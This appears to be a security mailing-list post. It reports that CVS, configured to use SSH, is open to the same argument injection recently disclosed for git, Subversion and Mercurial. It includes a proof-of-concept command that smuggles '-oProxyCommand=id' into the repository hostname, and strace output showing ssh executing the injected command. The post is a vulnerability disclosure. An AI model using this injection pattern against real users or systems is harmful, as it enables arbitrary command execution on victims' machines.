The announcement for git mentions and for git, Subversion, Mercurial, but makes no mention of CVS.  None of those CVEs are currently viewable at https://cve.mitre.org/cgi-bin/cvename.cgi?name= , and I don't know if these were discussed on a private list prior to publication, and whether that discussion included CVS.  CVS can be configured to use SSH for remote repos, such as with CVS_RSH=ssh.  In which case specifying a hostname of -o... triggers the same sort of thing:    $ strace -f -e execve cvs -d '-oProxyCommand=id;localhost:/bar' co yada 2>&1 | egrep id   execve("/usr/bin/cvs", ["cvs", "-d", "-oProxyCommand=id;localhost:/bar", "co", "yada"], /* vars */) = 0   [snip]   [pid execve("/usr/local/bin/ssh", ["ssh", "-oProxyCommand=id;localhost", "cvs server"], /* vars */) = -1 ENOENT (No such file or directory)   [pid execve("/usr/bin/ssh", ["ssh", "-oProxyCommand=id;localhost", "cvs server"], /* vars */) = 0   [pid execve("/bin/bash", ["/bin/bash", "-c", "exec id;localhost"], /* vars */) = 0   [pid execve("/usr/bin/id", ["id"], /* vars */) = 0   [pid +++ exited with 0 +++   [pid --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_status=0, si_utime=0, si_stime=0} ---   ssh_exchange_identification: Connection closed by remote host   [pid +++ exited with +++   --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_utime=0, si_stime=0} ---  Tested vanilla and Gentoo  Of course, the repo specification looks very odd, so tricking a victim may be harder than for SCM tools where it's prefixed by an ssh:// or masked behind a redirect.  Plus, first you would have find a victim.
